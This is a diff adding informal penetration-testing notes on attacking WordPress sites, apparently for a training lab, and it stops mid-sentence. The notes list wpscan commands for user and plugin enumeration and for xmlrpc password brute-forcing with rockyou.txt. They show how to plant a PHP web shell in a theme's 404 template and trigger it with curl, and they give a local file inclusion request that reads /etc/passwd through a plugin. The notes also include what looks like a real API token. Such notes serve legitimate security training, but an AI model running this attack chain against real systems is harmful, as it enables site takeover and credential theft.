@@ -1,0 +1,52 @@
+using wpscan for version enumeration and theme enumeration
+
+wpscan --url http://blog.inlanefreight.local/ --enumerate --api-token TK9skDUje3oj6hTzEn5wKLVKqlFjQexOns69raMqwhw
+
+to find users, we can go to the domain page and look for blogs made by users
+
+or we can do user enumeration
+
+wpscan --url http://www.anywordpressintalledsite.com/ --enumerate u
+
+or we can go to http://blog.inlanefreight.com/wp-json/wp/v2/users 
+
+we can scan vulnerabilities/ vulnerable 
+wpscan --url http://www.anywordpressintalledsite.com/ --enumerate vp
+
+for password attacks 
+
+check if xlmrpc is enabled oror not
+
+by going to  https://yourwebsite.com/xmlrpc.php
+
+or check in the wpscan --enumeration 
+
+if it is enabled, then we can do 
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+
+if its not, then we do
+
+wpscan --url http://www.anywordpressintalledsite.com/ –-passwords rockyou.txt –-usernames Phreakazoid
+
+once logged in,
+
+go to Appearance and click on the dropdown on the right side and pick theme to edit 
+go to the 404 template 
+
+and enter 
+
+system($_GET['cmd']);
+
+safe the file 
+
+In terminal 
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+
+we can also go to http://10.129.159.42/wp-content/uploads
+
+
+if we are in this situation
+
+curl -X GET http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+
+we need to change the /etc/passwd to be 
